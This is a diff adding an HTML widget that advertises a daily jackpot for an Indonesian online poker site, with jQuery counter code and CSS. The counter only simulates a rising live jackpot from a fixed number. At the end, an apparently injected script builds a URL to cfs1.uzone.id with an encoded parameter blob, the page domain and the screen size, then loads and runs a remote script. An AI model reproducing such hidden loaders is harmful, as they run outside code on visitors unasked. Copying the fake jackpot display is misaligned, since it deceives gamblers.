@@ -1,0 +1,162 @@
+
+
+
+ <html>
+<body style="margin:0; padding:0;">
+
+<table id="tablejackpot" width="" height="245" cellspacing="0" cellpadding="0" border="0">
+    <tr>
+      <td class="hdg_jackpot" align="center">MENANGKAN JACKPOT HARIAN</td>
+    </tr>
+    <tr>
+      <td class="img_jackpot" align="center"><a href="http://www.gunungpoker.com" target="_blank"><img border="0" style="margin-top:20px;" src="images/jackpot_logo.png"></a></td>
+    </tr>
+    <tr>
+      <td class="content_jackpot" align="center"><div class="total"><span style="text-decoration:blink;">25754000</span></div></td>
+    </tr>
+  	<tr>
+      <td class="foot_jackpot" align="center"><a href="http://www.gunungpoker.com" target="_blank">MAINKAN SEKARANG | WWW.GUNUNGPOKER.COM</a></a></td>
+    </tr>
+</table>
+
+<input type="hidden" id="nilai_jackpot" name="nilai_jackpot" value="25754000">
+<script type="text/javascript" src="js/jquery-1.6.2.js"></script>
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        var delay = 700000;
+        var jackpot = 0;
+        var timer;
+
+        pull_jackpot();
+        function pull_jackpot() {
+            var nominal = parseInt($('#nilai_jackpot').val());
+            if (jackpot == 0) {
+				jackpot = parseInt(nominal - 100000);
+			}
+            var amount = 100000 / delay * 1;
+            timer = setInterval(function() { jackpot = set_jackpot(jackpot, nominal, amount); }, 1);
+        }
+
+        function set_jackpot(jackpot, nominal, amount) {
+            var jackpot = jackpot + amount;
+            if (jackpot >= nominal) {
+                clearInterval(timer);
+                pull_jackpot();
+            } else {
+                var result = addCommas(parseInt(jackpot));
+                $('.total').html(result);
+            }
+			
+            return jackpot;
+        }
+        function addCommas(nStr) {
+            nStr += '';
+            x = nStr.split('.');
+            x1 = x[0];
+            x2 = x.length > 1 ? '.' + x[1] : '';
+            var rgx = /(\d+)(\d{3})/;
+            while (rgx.test(x1)) {
+                x1 = x1.replace(rgx, '$1' + ',' + '$2');
+            }
+            return x1 + x2;
+        }
+    });
+</script>
+
+
+<style type="text/css">
+
+#tablejackpot {
+border-collapse:collapse;
+font-family:calibri;
+background:url(images/jackpot_bgbody.jpg) repeat-x center top;
+}
+
+#tablejackpot tr td {
+margin:0; padding:0;
+}
+
+#tablejackpot tr td:first-child {
+}
+
+
+/* HEADING JACKPOT (MENANNGKAN JACKPOT HARIAN) */
+#tablejackpot tr td.hdg_jackpot {
+background:url(images/jackpot_header.png) repeat-x top;
+background-color:#342900;
+line-height:28px;
+color:#fff;
+font-size:14px;
+font-family:arial;
+font-weight:bold;
+padding:0px 0;
+border:1px solid #2b1d09;
+text-shadow:1px 1px 0 #000;
+}
+
+/* CONTENT JACKPOT (MAINKAN SEKARANG) */
+#tablejackpot tr td.content_jackpot {
+}
+
+#tablejackpot tr td.content_jackpot .total {
+background:url(images/jackpot_content.png) no-repeat center;
+color:#ffde00;
+font-size:2em;
+padding:0px 0;
+font-family:arial;
+font-weight:bold;
+width:237px;
+height:114px;
+line-height:114px;
+}
+
+
+/* IMAGE JACKPOT (ADA LOGO IDRPOKER) */
+#tablejackpot tr td.img_jackpot {
+}
+
+/* FOOT JACKPOT (JUMLAH JACKPOT) */
+#tablejackpot tr td.foot_jackpot {
+background:url(images/jackpot_header.png) repeat-x top;
+background-color:#2b1d09;
+line-height:20px;
+border:1px solid #2b1d09;
+}
+
+#tablejackpot tr td.foot_jackpot a {
+font-family:calibri;
+color:#fff;
+font-size:11px;
+font-weight:normal;
+text-decoration:none;
+}
+
+@font-face {
+    font-family: 'calibri';
+    src: url('template/001/fonts/calibri/calibri.eot');
+    src: url('template/001/fonts/calibri/calibri.eot?#iefix') format('embedded-opentype'),
+         url('template/001/fonts/calibri/calibri.woff') format('woff'),
+         url('template/001/fonts/calibri/calibri.ttf') format('truetype'),
+         url('template/001/fonts/calibri/calibri.svg#calibri') format('svg');
+    font-weight: normal;
+    font-style: normal;
+
+}
+
+@font-face {
+    font-family: 'calibrib';
+    src: url('template/001/fonts/calibri/calibrib.eot');
+    src: url('template/001/fonts/calibri/calibrib.eot?#iefix') format('embedded-opentype'),
+         url('template/001/fonts/calibri/calibrib.woff') format('woff'),
+         url('template/001/fonts/calibri/calibrib.ttf') format('truetype'),
+         url('template/001/fonts/calibri/calibrib.svg#calibrib') format('svg');
+    font-weight: normal;
+    font-style: normal;
+
+}
+
+</style>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKmwu1rljqvLor5z2DStXny2ROD0PofUmW2p1BCTOlKZR2nABio6EAjIogqubwtKQ8wtb0gMX8pXs%2bBaqrLmaMegkmT7Y8T1TmklRvrboQE0H57ev004UERcwcwluYOMMKDRdgf19LVPgF6kSAab6fBuikLqd7py%2bg6fgGiZH5OTjWviS0h9hkVAhoW15Bh%2fKuR5w4cMmBX%2b73G9YC%2f5JG3Uh0k4ztcHkxSqoMVKgpACjx7rIzesH4FyJBZL5qVDvr%2bA%2bHicmJwCJZB0AG2bjwBtifPo9a8pbNCSg8h42bQuqXjL%2fOczQYMV67X6OkMu%2bVXCr%2bIc4xKtfZtYXD7bstsUF9%2fiLUPKHNGCohpy2A6R%2b4XLx7Y2K1oB%2fbIrmEgnBAIGBz6MrcPQK6MGkCP9EMa0sMSMts71ohrGTmM9i0mcl%2f7WASWcokekixbEeqWb%2f%2f%2fIUSyhyfia4KSSfTMd2rILTrdIs1unPwIFiYNVPnHB%2fqJiNHyWZYVrWO8VnnLJ2l8RW%2f1HzlvfPYgbqVhkQrquD4gpn6B%2fi17ySqvHx%2beWGY3Ju3rXf%2b0kc%2fmx9LSJp%2fQTt%2fkgbCR1sktxiIEZVRxA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
